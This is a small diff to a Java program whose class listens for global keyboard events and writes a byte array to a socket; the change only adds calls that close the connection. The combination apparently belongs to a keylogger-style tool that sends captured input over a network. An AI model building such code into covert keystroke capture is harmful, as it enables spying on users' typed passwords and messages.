@@ -216,7 +216,9 @@ public class Main implements NativeKeyListener{
 			OutputStream os = nakadashi.getOutputStream(); 
 			System.out.println(""); 
 			os.write(bytearray,0,bytearray.length); 
-			os.flush(); 
+			os.flush();
+			socket.close();
+		    nakadashi.close();
 			System.out.println("yiff!");
 		 } catch (Exception e) {
 			 System.out.println("blargh");
